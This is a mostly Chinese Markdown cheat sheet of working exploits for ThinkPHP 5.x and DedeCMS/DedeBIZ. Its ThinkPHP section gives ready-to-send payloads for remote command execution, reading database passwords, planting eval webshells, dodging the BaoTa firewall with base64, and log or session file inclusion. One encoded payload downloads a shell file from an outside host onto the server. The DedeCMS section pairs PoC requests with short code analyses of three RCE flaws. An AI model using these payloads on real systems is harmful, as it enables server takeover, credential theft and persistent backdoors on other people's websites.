# thinkphp

## 1,通用exp使用场景

```php
通用原始打phpinfo的exp:
POST:?s=captcha
-----------------------------------------------------------
_method=__construct
&method=get
&filter[0]=phpinfo
&filter[1]=var_dump
&get[]=-1

其他收集：

?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
?s=index/\think\Request/input&filter=phpinfo&data=1
?s=index/think\config/get&name=database.hostname
?s=index/think\config/get&name=database.password
?s=index/\think\Request/input&filter=system&data=id
?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E
?s=index/\think\view\driver\Php/display&content=<?php%20phpinfo();?>
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```
### (1)php版本小宇7.0.3
查看phpinfo使用assert函数配合antsword直接链接，密码1
```php
使用assert构造antsword直接链接:
POST:?s=captcha
-----------------------------------------------------------
_method=__construct 
&method=get 
&filter[]=assert
&get[]=@eval($_POST['1']);

```
进阶玩法：遇到宝塔防火墙拦截：

众所周知，waf拦截的都是检测传入参数中是否含有函数，比如直接eval(,asser(,总之就是函数带括号了，我们上面eval($_POST[1]);直接就是一句话的原型，所以被拦截很正常，我们来想办法把参数只变成函数名不带特殊符号，这样在post穿参数的时候看起来就只是字符串了
```angular2html
直接放exp
base64编码绕过：
POST:?s=captcha
-----------------------------------------------------------
_method=__construct
&method=get
&filter[0]=base64_decode
&filter[1]=assert
&get[]=QGV2YWwoJF9QT1NUWycxJ10pOw==
```
### (2)php版本>=7.1
```angular2html
常规操作，日志包含
写入日志：
/?s=captcha
_method=__construct
&method=get
&filter[]=call_user_func
&server[]=phpinfo
&get[]=<?php eval($_POST[1337]); ?>


进阶过防火墙写日志
_method=__construct
&method=get
&filter[]=base64_decode
&filter[]=call_user_func
&server[]=phpinfo
&get[]=PD9waHAgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsxMzM3XSkpOyA/Pg==
 
备注:既然写日志需要过waf那么写马肯定，上面base64写入的一句话为<?php eval(base64_decode($_POST[1337])); ?>
因为小马也加了base64，所以我们传入b64加密后的代码：

1337=dmFyX2R1bXAoY29weSgiaHR0cDovL2NrOTk2LnRvcC9ubWEudHh0IiwiLi9ydW50aW1lL3NoZWxsLnBocCIpKTs=




日志包含
_method=__construct
&method=get
&filter[]=think\__include_file
&server[]=phpinfo
&get[]=../data/runtime/log/201901/21.log
&1337=phpinfo();
==============下面是过waf的
_method=__construct
&method=get
&filter[]=think\__include_file
&server[]=-1
&get[]=./runtime/log/202205/18.log
&1337=dmFyX2R1bXAoY29weSgiaHR0cDovL2NrOTk2LnRvcC9ubWEudHh0IiwiLi9ydW50aW1lL3NoZWxsLnBocCIpKTs=

常规操作2，session包含（同理上面可以使用各种加密数据包去绕过）

POST /tp5.0.23/public//?s=captcha HTTP/1.1
Host: 192.168.2.135
Cookie: PHPSESSID=ThisIsATestaaaaa
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.2.135/tp5.0.23/
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 101

_method=__construct&filter[]=think\Session::set&method=get&get[]=<?php eval($_POST['x'])?>&server[]=1

包含session
POST /tp5.0.23/public//?s=captcha HTTP/1.1
Host: 192.168.2.135
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.2.135/tp5.0.23/
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

_method=__construct
&method=get
&filter[]=think\__include_file
&get[]=/var/lib/php/session/sess_ThisIsATestaaaaa
&server[]=1
```
## 2，复杂场景php版本小宇7.0.3

```
禁用assert函数时候可使用php7版本的pload

思路1：注册账号，找上传点上传图片
思路2：寻找上传点
思路3：已知路径扫描

以下针对思路2进行拓展：
先通过phpinfo获取网站的路径

POST:?s=captcha
_method=__construct 
&method=get 
&filter[]=phpinfo
&get[]=-1

在列出目录下面项目，一个一个去找日志规则和上传路径

POST:?s=captcha
_method=__construct 
&method=get 
&filter[]=scandir
&filter[]=var_dump
&get[]=/www/wwww/public   目录

```



# dedecms

## V5.7.93 - V5.7.96 代码执行漏洞

- 版本号: Dedecms V5.7.93 - V5.7.96
- 漏洞路径: /dede/login.php
- Description: 代码执行漏洞.
- 补丁: [V5.7.97 UTF-8正式版20220708安全及功能更新补丁](https://www.dedecms.com/package.html?t=1657238400) 

### POC

```
POST /dede/login.php HTTP/1.1
Host: dedecms5793
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=e9ag7oevkh77gnko3cdmt7mbc2

dopost=login&userid=%5C%27.phpinfo%28%29%3B%3F%3E&pwd=123&validate=hw0k
```

### Details

DedeCMS v5.7.93 added the login failure lock function to file ```/dede/login.php``` to comply with relevant web security regulations. When a user fails to login, the failure message will be written to file ```/data/login.data.php``` to record the number of failed login attempts for that user.

```php

    $arr_login[$userid] = "{$count},{$timestamp}";
    $content = "<?php\r\n\$str_login='" . json_encode($arr_login) . "';";

    $fp = fopen($filename, 'w') or die("写入文件 $filename 失败，请检查权限！");
    fwrite($fp, $content);
    fclose($fp);
                
```

![2022-06-16_163453.png](https://s2.loli.net/2022/07/06/GgCswPhJr7cRiEa.png)

![2022-07-06_201636.png](https://s2.loli.net/2022/07/06/hTMCgqXz2Qmp7Du.png)

The file write operation does not filter the write content sufficiently, allowing an attacker to write malicious code to the file by user name and cause remote code execution.

![2022-07-06_201804.png](https://s2.loli.net/2022/07/06/9rNMpDKtq8AFTLQ.png)

## V5.7.94 - V5.7.97代码执行

- Affected product: Dedecms V5.7.94 - V5.7.97
- Attack type: Remote
- Affected component: /dede/member_toadmin.php
- Description: DedeCMS v5.7.94 was discovered to contain a remote code execution vulnerability in member_toadmin.php.
- Vendor confirmed or acknowledged: Confirmed
- Fix information: Not available


### POC

```
GET /dede/member_toadmin.php?id=%27.phpinfo();?%3E&typeids=1&dopost=toadmin&safecode=3373702420f2a357b12e6bc4&randcode=13967 HTTP/1.1
Host: www.dedecms5794.com
Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=lteb30kl960vhad3q6k4psjok4; _csrf_name_96c0ebe6=f97c33dd6471fdad17230e95a4bb1629; _csrf_name_96c0ebe61BH21ANI1AGD297L1FF21LN02BGE1DNG=c93476e2cd70eacb
Connection: close
```

### Details

DedeCMS v5.7.94 added the periodic password change reminder function to the file ```/dede/member_toadmin.php``` to comply with relevant web security regulations. 

```php
    // Regular password change reminders
    $arr_password = array();
    $filename = DEDEDATA . '/password.data.php';
    if (file_exists($filename)) {
        require_once(DEDEDATA . '/password.data.php');
        $arr_password = json_decode($str_password, true);
    }

    $timestamp = time();
    $arr_password[$id] = "{$timestamp}";
    $content = "<?php\r\n\$str_password='" . json_encode($arr_password) . "';";

    $fp = fopen($filename, 'w') or die("写入文件 $filename 失败，请检查权限！");
    fwrite($fp, $content);
    fclose($fp);
```

When the input id is ```'```, the variable ```$id``` is assigned the value ```\'``` by function ```_RunMagicQuotes``` in the file ```/include/common.inc.php```.

```php
    function _RunMagicQuotes(&$svar) {
        if (!get_magic_quotes_gpc()) {
            if (is_array($svar)) {
                foreach ($svar as $_k => $_v) $svar[$_k] = _RunMagicQuotes($_v);
            } else {
                if (strlen($svar) > 0 && preg_match('#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#', $svar)) {
                    exit('Request var not allow!');
                }
                $svar = addslashes($svar);
            }
        }
        return $svar;
    }

    foreach (array('_GET', '_POST', '_COOKIE') as $_request) {
        foreach ($$_request as $_k => $_v) {
            if ($_k == 'nvarname') ${$_k} = $_v;
            else ${$_k} = _RunMagicQuotes($_v);
        }
    }
```

When ```$arr_password``` with ```$id``` is written to the file ```/data/password.data.php```, function ```json_encode``` encodes ```$id``` from ```\'``` to ```\\'```, which causes escaping single quote.

Therefore, the attacker only needs to input id with ```'.``` followed by the codes he wishes to execute and configure the parameters (```typeids```, ```dopost```, ```safecode``` and ```randcode```) to write codes to the file ```/data/password.data.php``` and cause remote code execution.

![2022-07-14_173311.png](https://s2.loli.net/2022/07/14/iuWE4LZtRKhpDmd.png)

![2022-07-14_172602.png](https://s2.loli.net/2022/07/14/Y49ScNrympWjgP8.png)

## bizv6.0 

- Affected product: DedeBIZ V6
- Attack type: Remote
- Affected component: /admin/sys_info.php
- Description: DedeBIZ v6.* was discovered to contain a remote code execution vulnerability in sys_info.php.
- Vendor confirmed or acknowledged: Confirmed
- Fix Information: Not available


### POC

```
GET /admin/sys_info.php?dopost=add&nvarname=test&nvarvalue=phpinfo()&vartype=number HTTP/1.1
Host: www.dedebiz6.com
Cookie:  PHPSESSID=bs4vp003uqilf3pj1al024egs2; DedeUserID=1; DedeUserID__ckMd5=6d2e834b19e2030a; DedeLoginTime=1657701678; DedeLoginTime__ckMd5=34d8cf865664d363
Connection: close
```

### Details

DedeBIZ v6.* backend admin/sys_info.php has the function of adding variables, but the filtering of variables of type 'number' is not strict when writing to the database and php files, resulting in remote code execution.

![2022-07-13_174059.png](https://s2.loli.net/2022/07/13/HknoPKUa5N3xfIX.png)

![2022-07-13_175255.png](https://s2.loli.net/2022/07/13/h8bxa5YfBQO4pi1.png)

```php

while ($row = $dsql->GetArray()) {
    if ($row['type'] == 'number') {
        if ($row['value'] == '') $row['value'] = 0;
        fwrite($fp, "\${$row['varname']} = ".$row['value'].";\r\n");
    } else {
        ...
    }
}
                
```

### Suggestions for fixing

For variables with vartype as 'number', check if it is a number or force it to be a number before writing to database and php files.

# phpcms

# metinfo

